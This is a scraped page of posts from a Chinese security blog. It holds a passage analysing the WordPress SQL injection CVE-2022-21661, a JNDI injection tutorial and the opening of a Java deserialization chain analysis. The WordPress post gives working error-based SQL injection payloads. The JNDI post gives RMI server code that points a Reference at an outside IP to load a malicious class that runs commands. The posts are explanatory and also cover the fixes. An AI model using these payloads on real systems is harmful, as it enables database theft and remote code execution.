<p>​    变量<code>$this-&gt;is_singular</code>初始化之后为<code>false</code>，所以这里的<code>if</code>语句是会执行的，而下面的<code>$this-&gt;parse_tax_query($q)</code>语句，跟进去，其实就是给变量<code>$this-&gt;tax_query</code>赋值，其值为<code>WP_Tax_Query</code>类对应的对象，同时利用传入的<code>$q</code>变量，对该对象进行了一些初始化。这里关键就是<code>$q</code>变量，我们向上追溯，查看一下该变量的生成过程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$q = &amp;$this-&gt;query_vars;</span><br><span class="line"></span><br><span class="line">$q = $this-&gt;fill_query_vars( $q );</span><br></pre></td></tr></table></figure>

<p>​    首先<code>$q</code>变量获取<code>$this-&gt;query_vars</code>，通过上面的分析，我们知道这个变量是可控的，也就是我们通过<code>POST</code>传入的参数值。接下来调用<code>fill_query_vars</code>方法，跟进去会发现这个函数就是向<code>$q</code>这个数组里面添加了一些<code>key</code>值。我们可以传入一个数组，然后<code>var_dump</code>出来看看：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114161050220.png" alt="image-20220114161050220"></p>
<p>​    接下来进入<code>$this-&gt;parse_tax_query($q)</code>这个函数看看。该函数就是通过传入的<code>$q</code>数组，然后赋值给<code>$tax_query</code>变量，然后利用该变量去初始化对象<code>$this-&gt;tax_query = new WP_Tax_Query( $tax_query );</code>，在<code>parse_tax_query</code>函数中，我们需要给<code>$tax_query</code>变量赋值，就需要传入的数组中带有<code>tax_query</code>这个关键词即可。我们跟进到这个类的构造函数去看看：（简单说明就是经过处理的<code>$q</code>变量的值作为了<code>WP_Tax_Query</code>对象的构造函数的参数值）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114162159550.png" alt="image-20220114162159550"></p>
<p>​    可以看到<code>$this-&gt;queries</code>变量的值是由<code>$tax_query</code>赋值得到的，只不过这里做了一些过滤，即调用了<code>sanitize_query</code>函数进行了处理。</p>
<p>​    到这里，我们就进入到了<code>WP_Tax_Query</code>类，并且我们可以控制传入这个类的构造函数的参数值。接下来看看这个构造函数中对传入的参数值做了哪些处理，也就是这个<code>sanitize_query</code>函数：（这里只截取关键部分了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">elseif ( self::is_first_order_clause( $query ) ) &#123;</span><br><span class="line">				$cleaned_clause          = array_merge( $defaults, $query );</span><br><span class="line">				$cleaned_clause[&#x27;terms&#x27;] = (array) $cleaned_clause[&#x27;terms&#x27;];</span><br><span class="line">				$cleaned_query[]         = $cleaned_clause;</span><br><span class="line">				if ( ! empty( $cleaned_clause[&#x27;taxonomy&#x27;] ) &amp;&amp; &#x27;NOT IN&#x27; !== $cleaned_clause[&#x27;operator&#x27;] ) &#123;</span><br><span class="line">					$taxonomy = $cleaned_clause[&#x27;taxonomy&#x27;];</span><br><span class="line">					if ( ! isset( $this-&gt;queried_terms[ $taxonomy ] ) ) &#123;</span><br><span class="line">						$this-&gt;queried_terms[ $taxonomy ] = array();</span><br><span class="line">					&#125;</span><br><span class="line">					if ( ! empty( $cleaned_clause[&#x27;terms&#x27;] ) &amp;&amp; ! isset( $this-&gt;queried_terms[ $taxonomy ][&#x27;terms&#x27;] ) ) &#123;</span><br><span class="line">						$this-&gt;queried_terms[ $taxonomy ][&#x27;terms&#x27;] = $cleaned_clause[&#x27;terms&#x27;];</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					if ( ! empty( $cleaned_clause[&#x27;field&#x27;] ) &amp;&amp; ! isset( $this-&gt;queried_terms[ $taxonomy ][&#x27;field&#x27;] ) ) &#123;</span><br><span class="line">						$this-&gt;queried_terms[ $taxonomy ][&#x27;field&#x27;] = $cleaned_clause[&#x27;field&#x27;];</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<p>​    我们要进入到这个<code>if</code>语句，就需要通过<code>is_first_order_clause</code>函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected static function is_first_order_clause( $query ) &#123;</span><br><span class="line">	return is_array( $query ) &amp;&amp; ( empty( $query ) || array_key_exists( &#x27;terms&#x27;, $query ) || array_key_exists( &#x27;taxonomy&#x27;, $query ) || array_key_exists( &#x27;include_children&#x27;, $query ) || array_key_exists( &#x27;field&#x27;, $query ) || array_key_exists( &#x27;operator&#x27;, $query ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这个函数比较简单，就是需要传入的数据通过<code>foreach</code>迭代之后，仍然是一个数组，也就是传入的需要是一个二维数组，并且需要携带一些<code>key</code>值。（加上前面的需要传入<code>tax_query</code>关键词，到这里就需要传入的是一个三维数组）</p>
<p>​    由于我们要控制<code>terms</code>的值，所以传入的<code>terms</code>也要是一个数组，也就是说如果要控制<code>terms</code>值，需要传入一个四维数组，例如如下<code>POST</code>数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=AND</span><br></pre></td></tr></table></figure>

<p>​    我们在这里先分析一下这个<code>POST</code>的数据。首先需要一个<code>tax_query</code>，是为了能给<code>$tax_query</code>变量赋值，然后我这里加了一个<code>1</code>是为了构造多维数组，这样传入进去之后，到上面这个<code>foreach</code>取出来之后，就是一个数组，从而构造了<code>$this-&gt;queries</code>，并且由于我们需要控制<code>terms</code>值，<code>$cleaned_clause[&#39;terms&#39;] = (array) $cleaned_clause[&#39;terms&#39;];</code>表名我们需要传入一个数组来进行<code>merge</code>函数的拼接从而覆盖。传入以上数据之后，<code>$this-&gt;queries</code>的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [1] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [include_children] =&gt; 1</span><br><span class="line">            [terms] =&gt; Array</span><br><span class="line">                (</span><br><span class="line">                    [1] =&gt; AND</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>​    以上分析都是在初始化<code>WP_Tax_Query</code>这个对象。接下来继续向下分析，开始调用<code>WP_Tax_Query::get_sql</code>方法，然后调用了<code>WP_Tax_Query::get_sql_clauses</code>方法：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114162544292.png" alt="image-20220114162544292"></p>
<p>​    之后将<code>$this-&gt;queries</code>变量的值传入<code>get_sql_for_query</code>函数，我们继续跟进一下这个函数：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114163150988.png" alt="image-20220114163150988"></p>
<p>​    如果我们想要调用<code>get_sql_for_clause</code>方法的话，就需要对传入的数据进行一个控制，这里的关键在于<code>is_array($clause)</code>语句，也就是说，我们通过构造以后，这里需要传入一个二维数组，进而能够执行到这个条件里面并且需要满足<code>is_first_order_clause</code>函数，因此我们按照上面的构造方式是可以执行到这里的，并且这里的<code>$clause</code>的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">array(5) &#123;</span><br><span class="line">  [&quot;taxonomy&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;terms&quot;]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [1]=&gt;</span><br><span class="line">    string(3) &quot;AND&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;field&quot;]=&gt;</span><br><span class="line">  string(7) &quot;term_id&quot;</span><br><span class="line">  [&quot;operator&quot;]=&gt;</span><br><span class="line">  string(2) &quot;IN&quot;</span><br><span class="line">  [&quot;include_children&quot;]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    接下来就进入了<code>get_sql_for_clause</code>函数，也就是我们最终拼接<code>SQL</code>语句的地方，但在拼接之前，我们需要绕过<code>clean_query</code>函数，我们跟进这个函数看看：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119161246170.png" alt="image-20220119161246170"></p>
<p>​    这里为了不让他异常退出，我们需要添加一个<code>field</code>字段，让其值等于<code>term_taxonomy_id</code>即可，构造语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=aa&amp;query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=AND&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span><br></pre></td></tr></table></figure>

<p>​    并且在函数的最后，调用了<code>$this-&gt;transform_query( $query, &#39;term_taxonomy_id&#39; );</code>，我们跟进去，正好判定<code>field</code>的值，从而<code>return</code>，跳过了后面的执行操作：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119162028818.png" alt="image-20220119162028818"></p>
<p>​        接下来就是<code>SQL</code>语句的拼接了，根据我们构造的<code>operator</code>的不同值，没有构造的话就是<code>IN</code>了，进行不同的拼接操作，这里是<code>IN</code>，我们进入到这个<code>if</code>语句：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119162417374.png" alt="image-20220119162417374"></p>
<p>​    我们在<code>terms</code>处构造报错注入代码即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=aa&amp;query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=AND&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span><br></pre></td></tr></table></figure>

<p>前面的分析都是介绍如何一步一步执行到<code>get_sql_for_clause</code>这个函数，并且介绍了传入这个函数的变量是如何控制的。接下来就是该漏洞点主要的部分。</p>
<p>​    在<code>get_sql_for_clause</code>这个函数中，调用了<code>clean_query</code>方法对我们构造的数据进行了一个清洗，然后取出其中的<code>terms</code>值，带入了<code>SQL</code>拼接语句中，<code>payload</code>如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,user()),0x7e)#&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119162842107.png" alt="image-20220119162842107"></p>
<h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><p>​    我这里将<code>new WP_Query($_POST[&#39;query_vars&#39;])</code>语句放置到<code>wp-admin\admin-ajax.php</code>中：（在实际场景下，只要该处输入可控，即可造成<code>SQL</code>注入漏洞）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119163052340.png" alt="image-20220119163052340"></p>
<p>​    复现的时候开启一下<code>debug</code>即可看见报错注入（也可以进行盲注了）；最后的构造语句为：（这里加上<code>action</code>参数是为了执行到目标代码）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=aa&amp;query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,user()),0x7e)#&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119162842107.png" alt="image-20220119162842107"></p>
<h2 id="四、修复方式"><a href="#四、修复方式" class="headerlink" title="四、修复方式"></a>四、修复方式</h2><p>​    官网已经发布更新版本，或者按照官网的修复方式，自行添加代码：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114152416687.png" alt="image-20220114152416687"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/" data-id="cl8h223i00005b3dpbvu95avf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Java安全---JNDI注入解析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/" class="article-date">
  <time datetime="2022-03-31T02:05:06.000Z" itemprop="datePublished">2022-03-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Java安全—JNDI注入解析"><a href="#Java安全—JNDI注入解析" class="headerlink" title="Java安全—JNDI注入解析"></a><code>Java</code>安全—<code>JNDI</code>注入解析</h1><h2 id="一、什么是JNDI"><a href="#一、什么是JNDI" class="headerlink" title="一、什么是JNDI"></a>一、什么是<code>JNDI</code></h2><p>​    <code>JNDI</code>全称为<code>Java</code>命名和目录接口。我们可以理解为<code>JNDI</code>提供了两个服务，即命名服务和目录服务。</p>
<p>​    命名服务将一个对象和一个名称进行绑定，然后放置到一个容器里面。当我们想要获取这个对象的时候，就可以通过容器来查找这个名称，从而获得这个对象。</p>
<p>​    目录服务就是将一些对象的属性放置到容器中，然后想要操作这个属性的时候，就通过容器来进行查找。</p>
<p>​    对比一下命名服务和目录服务，其实命名服务就是绑定对象，而目录服务就是绑定了对象的属性。在<code>JNDI</code>中，命名服务和目录服务是一起结合提供的，最容易理解的一个例子就是<code>RMI</code>。</p>
<p>​    在<code>RMI</code>的服务端，通常我们会将一个远程对象和一个名称进行绑定，然后将其注册到注册表里面。除了通过<code>RMI</code>来实现客户端从而获取到对象之外，还可以使用<code>JNDI</code>来获取对象。<code>JNDI</code>其实就是对这些提供了命名服务或者目录服务的逻辑进行了一个封装，例如上面的<code>RMI</code>，我们可以直接调用<code>JNDI</code>提供的<code>lookup</code>函数来远程获取，例如：<code>lookup(&quot;rmi://127.0.0.1/bind&quot;)</code>；如果提供服务的是<code>LDAP</code>，我们同样可以通过<code>lookup(&quot;ldap://127.0.0.1/&quot;)</code>来进行访问。</p>
<p>​    通过上面这个例子，不难看出<code>JNDI</code>其实就是对这些服务的访问做了一个统一的处理。</p>
<h2 id="二、JNDI的简单实践"><a href="#二、JNDI的简单实践" class="headerlink" title="二、JNDI的简单实践"></a>二、<code>JNDI</code>的简单实践</h2><p>​    通过上面的介绍，我们知道，想要实现<code>JNDI</code>，我们首先得需要一个容器，然后我们将一个对象绑定到容器里面。（这里结合<code>RMI</code>来实现一个简单的示例）</p>
<h3 id="1、创建一个远程调用对象"><a href="#1、创建一个远程调用对象" class="headerlink" title="1、创建一个远程调用对象"></a>1、创建一个远程调用对象</h3><p>​    首先创建一个接口，继承<code>Remote</code>接口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface RemoteMethod extends Remote &#123;</span><br><span class="line">    public void sayBye() throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    创建一个远程对象，实现该接口，并继承<code>UnicastRemoteObject</code>类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class M1sn0w extends UnicastRemoteObject implements RemoteMethod &#123;</span><br><span class="line">    public String name;</span><br><span class="line">    public int age;</span><br><span class="line">    public M1sn0w(String name,int age) throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.age = age;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void sayBye()&#123;</span><br><span class="line">        System.out.println(&quot;say bye!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2、开启RMI服务端"><a href="#2、开启RMI服务端" class="headerlink" title="2、开启RMI服务端"></a>2、开启<code>RMI</code>服务端</h3><p>​    创建一个<code>RMI</code>服务端，并将一个远程对象绑定到注册表中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">        M1sn0w m1sn0w = new M1sn0w(&quot;m1sn0w&quot;,22);</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line">        Naming.bind(&quot;m1sn0w&quot;,m1sn0w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3、利用JNDI远程获取对象"><a href="#3、利用JNDI远程获取对象" class="headerlink" title="3、利用JNDI远程获取对象"></a>3、利用<code>JNDI</code>远程获取对象</h3><p>​        我们想要使用<code>JNDI</code>来远程获取对象，首先得需要获取一个容器，我们先看如下实例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class jndi &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NamingException &#123;</span><br><span class="line">        Properties env = new Properties();</span><br><span class="line">      env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL,&quot;rmi://127.0.0.1:1099&quot;);</span><br><span class="line">        Context ctx = new InitialContext(env);</span><br><span class="line">        RemoteMethod remoteMethod = (RemoteMethod) ctx.lookup(&quot;m1sn0w&quot;);</span><br><span class="line">        remoteMethod.sayBye();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>Context.PROVIDER_URL</code>参数表示指定一个远程加载的地址，例如上面的<code>rmi://127.0.0.1:1099</code>，当我们通过<code>lookup</code>函数进行查找对象的时候，其实就是在<code>rmi://127.0.0.1:1099/m1sn0w</code>这个里面进行的查找。</p>
<p>​    最后远程调用方法之后，会在服务端执行代码，将结果返回给<code>JNDI</code>客户端。</p>
<h2 id="三、JNDI注入漏洞"><a href="#三、JNDI注入漏洞" class="headerlink" title="三、JNDI注入漏洞"></a>三、<code>JNDI</code>注入漏洞</h2><p>​    通过上面的这个例子，我们可以知道，通过<code>JNDI</code>可以远程加载对象。除了通过上面的<code>Context.PROVIDER_URL</code>来设置<code>URL</code>以外，我们可以直接在<code>lookup</code>参数指定<code>URL</code>，例如<code>lookup(&quot;rmi://127.0.0.1:1099/m1sn0w&quot;)</code>，由于<code>JNDI</code>存在一个动态地址转换协议，也就是说当我们在<code>lookup</code>上指定一个<code>URL</code>的时候，就会优先于<code>Context.PROVIDER_URL</code>的设置进行加载。</p>
<p>​    至此，就可以想到，如果这个<code>lookup</code>参数可控的话，那么我们就可以传入恶意的<code>url</code>地址来控制受害者加载攻击者指定的恶意类。但是这里又会遇到一个问题，就是怎么进行攻击呢？</p>
<p>​    当我们指定一个恶意的<code>URL</code>地址之后，受害者在获取完这个远程对象之后，开始调用恶意方法。但是在<code>RMI</code>中，调用远程方法，最终的执行是服务端去执行。只是把最终的结果以序列化的形式传递给客户端，也就是这里所说的受害者。当然，如果受害者内部存在漏洞组件存在反序列化漏洞的话，我们可以构造恶意的序列化对象，返回给客户端，当客户端在进行反序列化的时候，可以触发漏洞；如果目标组件不存在反序列化漏洞，我们返回一个恶意对象，但是客户端本地没有这个<code>class</code>文件，当然也就不能成功获取到这个对象。</p>
<h2 id="四、Reference类"><a href="#四、Reference类" class="headerlink" title="四、Reference类"></a>四、<code>Reference</code>类</h2><p>​    为了解决上面这个问题，我们引入了一个<code>Reference</code>类，这个类表示对存在于命名或者目录系统以外的对象的引用。简单理解一下，就是如果<code>RMI</code>服务端返回的是一个<code>Reference</code>对象或者其子类对象的话，当客户端获取远程对象<code>Stub</code>的时候，我们就可以指定客户端从一个具体的服务端上去加载<code>class</code>文件从而完成这个类的实例化。</p>
<p>​    <code>Reference</code>类实例化需要三个参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">className：表示远程加载时所使用的类名</span><br><span class="line">classFactory：加载class中需要实例类的名称</span><br><span class="line">classFactoryLocation：指定远程加载类的地址</span><br></pre></td></tr></table></figure>

<p>​    例如我们创建如下<code>Reference</code>类实例，并将其绑定到注册表中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException, RemoteException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">        Reference reference = new Reference(&quot;111&quot;,&quot;evil&quot;,&quot;http://148.70.205.134:8080/&quot;);</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line">        Naming.bind(&quot;m1sn0w&quot;,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    然后编写一个<code>evil.java</code>恶意类，编译之后，将<code>evil.class</code>上传到服务器上：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">public class evil &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    之后使用<code>JNDI</code>来远程获取这个绑定的对象，最终会在本地弹出计算器框：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        Properties env = new Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL,&quot;rmi://127.0.0.1:1099&quot;);</span><br><span class="line">        Context ctx = new InitialContext(env);</span><br><span class="line">        ctx.lookup(&quot;m1sn0w&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211228115153229.png" alt="image-20211228115153229"></p>
<p>​    这里有几个坑需要注意一下：</p>
<p>​    1、首先就是<code>jdk</code>的版本，后面我们会再提，高版本的<code>jkd</code>做了限制，因此实验使用<code>jkd1.7</code>版本</p>
<p>​    2、恶意类中不要带<code>package</code>包名，否则可能会报错</p>
<p>​    我们梳理一下整个调用流程。首先我们创建了一个<code>Reference</code>实例对象，这三个参数表示的意思为：当远程加载对象之后，会先从本地找<code>111.class</code>文件是否存在，如果不存在，则从远程服务端<code>http://148.70.205.134:8080</code>中查找<code>evil.class</code>文件。接下来使用了<code>ReferenceWrapper</code>来包裹<code>Reference</code>是，原因是远程对象需要继承<code>UnicastRemoteObject</code>类，而<code>Reference</code>类并没有对该类进行继承，因此我们需要封装一下，跟进<code>ReferenceWrapper</code>类，可以发现其继承了<code>UnicastRemoteObject</code>类：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211228115847357.png" alt="image-20211228115847357"></p>
<p>​    到此，我们对<code>JNDI</code>注入攻击有了一个大致的了解。对于<code>JNDI</code>注入漏洞，我们的攻击方式如下：（利用<code>RMI</code>）</p>
<p>​    1、在存在注入的地方利用<code>RMI</code>远程加载，指向恶意的<code>URL</code></p>
<p>​    2、我们在恶意的<code>URL</code>上搭建一个<code>RMI</code>服务，并绑定一个<code>Reference</code>对象，并指定恶意类的加载路径</p>
<p>​    3、在服务端上放置恶意类编译后的<code>class</code>文件</p>
<h2 id="五、官网修复策略"><a href="#五、官网修复策略" class="headerlink" title="五、官网修复策略"></a>五、官网修复策略</h2><p>最后我们来看一下，针对不同的<code>JDK</code>版本，官方给出了一些限制：</p>
<p>1、<code>JDK 6u45、7u21</code>之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为<code>true</code>，表示禁用自动加载远程类文件。</p>
<p>2、<code>JDK 6u141、7u131、8u121</code>之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>RMI</code>和<code>CORBA</code>协议使用远程<code>codebase</code>的选项。</p>
<p>3、<code>JDK 6u211、7u201、8u191</code>之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止<code>LDAP</code>协议使用远程<code>codebase</code>的选项</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/" data-id="cl8h223ho0002b3dp7b4aax9g" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Java CC链1-5分析与总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2022-03-30T03:23:50.000Z" itemprop="datePublished">2022-03-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Java-CC链1-5分析与总结"><a href="#Java-CC链1-5分析与总结" class="headerlink" title="Java CC链1-5分析与总结"></a>Java CC链1-5分析与总结</h1><p>前言：在ysoserial工具中，CommonsCollection反序列化链一共有7条，本文对这七条链做一个分析与调试，并找出其中的相似点与不同点，最后给出自己的一些思考。（有时候，思路比细节更重要）</p>
<h2 id="一、CommonsCollection1链"><a href="#一、CommonsCollection1链" class="headerlink" title="一、CommonsCollection1链"></a>一、CommonsCollection1链</h2><p>   正常情况下，如果想要调用Runtime来执行任意命令，需要调用其静态方法getRuntime来获取一个实例对象，然后再调用其exec来执行命令。如果我们想通过反射的方式来进行调用，具体过程如下：</p>
<ul>
<li>通过反射获取getRuntime静态方法</li>
<li>调用getRuntime方法获取一个Runtime实例对象</li>
<li>通过反射获取exec方法，并将获取到的Runtime实例对象传入进行调用</li>
</ul>
